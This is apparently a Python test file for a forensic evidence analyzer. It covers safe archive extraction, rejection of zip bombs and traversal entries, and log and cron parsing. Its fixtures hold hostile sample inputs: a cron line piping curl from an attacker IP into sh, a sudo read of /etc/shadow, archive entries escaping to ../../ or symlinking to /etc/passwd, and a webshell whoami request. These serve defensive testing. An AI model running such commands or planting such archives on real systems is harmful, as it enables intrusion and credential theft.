"""Archives parmi les preuves (extraction sûre, origine tracée) et conclusion de fin de scan."""
from __future__ import annotations

import io
import os
import tarfile
import zipfile

import pytest

ATTACKER = "203.0.113.42"
ACCESS_LINE = f'{ATTACKER} - - [25/Oct/2026:07:21:00 +0000] "GET /wp-content/uploads/dump.sql.gz HTTP/1.1" 200 12582912 "-" "axios/0.21.1"\n'


@pytest.fixture
def case(tmp_path, monkeypatch):
    from forensic_analyzer.utils import exports

    before = exports.export_root()
    monkeypatch.chdir(tmp_path)
    exports.set_export_root(os.path.join(str(tmp_path), "export", "affaire"))
    evidence = tmp_path / "preuves"
    evidence.mkdir()
    yield evidence
    exports.set_export_root(before)


def _tar_add(tar, name, data=b"", **kw):
    info = tarfile.TarInfo(name)
    for k, v in kw.items():
        setattr(info, k, v)
    info.size = len(data)
    tar.addfile(info, io.BytesIO(data))


def test_archives_are_extracted_and_their_content_analyzed(case):
    from forensic_analyzer.core.scanner import auto_scan, default_registry

    with zipfile.ZipFile(case / "logs.zip", "w") as z:
        z.writestr("nginx/nginx-access.log", ACCESS_LINE)
    with tarfile.open(case / "home.tar.gz", "w:gz") as t:
        _tar_add(t, "root/.bash_history", b"history -c\n")

    report = auto_scan(str(case), default_registry())
    origins = {f.metadata.get("Origine (archive)") for f in report.findings}
    assert {"logs.zip:nginx/nginx-access.log", "home.tar.gz:root/.bash_history"} <= origins
    assert any("Exfiltration" in k for f in report.findings for k in f.metadata)   # contenu réellement analysé
    assert all("extrait(s) et analysé(s)" in n for n in report.scan_notes)
    assert sorted(os.listdir(case)) == ["home.tar.gz", "logs.zip"]               # rien écrit dans les preuves


def test_hostile_archive_entries_are_refused(case):
    from forensic_analyzer.core.archives import extract_archive

    with tarfile.open(case / "piege.tar", "w") as t:
        _tar_add(t, "../../echappe.txt", b"x")
        _tar_add(t, "/etc/absolu.txt", b"x")
        _tar_add(t, "lien", type=tarfile.SYMTYPE, linkname="/etc/passwd")
        _tar_add(t, "ok.txt", b"contenu")
    files, note = extract_archive(str(case / "piege.tar"))
    assert [os.path.basename(f) for f in files] == ["ok.txt"]
    assert "3 entrée(s) écartée(s)" in note
    assert not os.path.exists(case.parent / "echappe.txt")

    with zipfile.ZipFile(case / "piege.zip", "w") as z:
        z.writestr("../../echappe.txt", "x")
        link = zipfile.ZipInfo("lien")
        link.external_attr = (0o120777 << 16)
        z.writestr(link, "/etc/passwd")
        z.writestr("ok.txt", "contenu")
    files, note = extract_archive(str(case / "piege.zip"))
    assert [os.path.basename(f) for f in files] == ["ok.txt"] and "2 entrée(s) écartée(s)" in note


def test_decompression_bombs_and_container_images_are_not_extracted(case, monkeypatch):
    from forensic_analyzer.core import archives

    monkeypatch.setattr(archives, "MAX_TOTAL_BYTES", 1024)
    with zipfile.ZipFile(case / "bombe.zip", "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("zeros.bin", b"\0" * 100_000)
    files, note = archives.extract_archive(str(case / "bombe.zip"))
    assert files == [] and "limite" in note

    with tarfile.open(case / "image.tar", "w") as t:
        for name in ("oci-layout", "manifest.json", "index.json"):
            _tar_add(t, name, b"{}")
    files, note = archives.extract_archive(str(case / "image.tar"))
    assert files == [] and "image de conteneur" in note


def test_refused_sudo_is_labelled(tmp_path):
    from forensic_analyzer.analyzers.log_analyzer import LogAnalyzer

    log = tmp_path / "auth.log"
    log.write_text("Oct 25 07:08:20 web-01 sudo:   www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/cat /etc/shadow\n"
                   "Oct 25 07:08:20 web-01 sudo:   www-data : NOT in sudoers\n")
    meta = LogAnalyzer().analyze(str(log)).metadata
    assert meta["Commandes sudo"] == "www-data : /bin/cat /etc/shadow (REFUSÉE)"


def test_conclusion_summarizes_alerts_corroboration_chain_and_limits(capsys):
    from forensic_analyzer.core.correlation import correlate
    from forensic_analyzer.models.finding import FindingModel, ReportModel
    from forensic_analyzer.output import ui

    web = FindingModel(type="log_analysis", file="/p/nginx-access.log",
                       metadata={f"[ALERTE] Brute-force {ATTACKER}": "2401 tentatives"},
                       extra={"iocs": {"ips": [ATTACKER]}, "log_type": "web_access"})
    net = FindingModel(type="pcap", file="/p/traffic.pcap", metadata={},
                       extra={"http_attack": {"attackers": [ATTACKER]}})
    timeline = FindingModel(type="timeline", file="multi-source",
                            metadata={"[ATTENTION] Décalage d'horloge": "5 j 7 h 20 min entre le PCAP et les journaux hôtes"},
                            extra={"facts": [{"timestamp": "2026-10-25T06:48:00+00:00", "confidence": "élevée",
                                              "sources": ["pcap", "web_access"], "description": "Début du brute-force"}]})
    report = ReportModel.from_findings([web, net, correlate([web, net]), timeline],
                                       skipped_files=["/p/CONSTAT.md"], scan_notes=["images.tar : image de conteneur"])
    ui.render_conclusion(report)
    out = capsys.readouterr().out
    for expected in ("CONCLUSION DE L'ANALYSE", "Journaux Web / Système 1", f"Corroboré : {ATTACKER}",
                     "5 j 7 h 20 min", "Début du brute-force", "CONSTAT.md", "image de conteneur"):
        assert expected in out, expected


def test_only_real_crontabs_are_parsed_as_cron(tmp_path):
    from forensic_analyzer.analyzers.linux import LinuxArtifactsAnalyzer

    (tmp_path / "rules").mkdir()
    sigma = tmp_path / "rules" / "tp3_cron_d_creation.yml"
    sigma.write_text("title: creation dans /etc/cron.d\n")
    (tmp_path / "cron.d").mkdir()
    cron = tmp_path / "cron.d" / "updater"
    cron.write_text("0 3 * * * www-data curl http://203.0.113.42/x | sh\n")
    analyzer = LinuxArtifactsAnalyzer()
    assert not analyzer.can_handle(str(sigma)) and analyzer.can_handle(str(cron))


def test_missing_manifest_entries_are_not_alerts(tmp_path):
    from forensic_analyzer.analyzers.integrity import IntegrityAnalyzer

    manifest = tmp_path / "m.sha256"
    manifest.write_text(f"{'0' * 64}  absent.txt\n")
    meta = IntegrityAnalyzer().analyze(str(manifest), phase="initiale").metadata
    assert not any(k.startswith("[ALERTE]") for k in meta) and meta["Verdict"].startswith("Vérification incomplète")


def test_webshell_command_yields_a_single_timeline_event(tmp_path):
    from forensic_analyzer.analyzers.log_analyzer.parsers import parse_web_access_log

    log = tmp_path / "nginx-access.log"
    log.write_text(f'{ATTACKER} - - [25/Oct/2026:07:08:00 +0000] "GET /wp-content/uploads/x.php?c=whoami HTTP/1.1" 200 455 "-" "axios/0.21.1"\n')
    events = parse_web_access_log(str(log))["events"]
    assert [e["event_type"] for e in events] == ["webshell_command"]
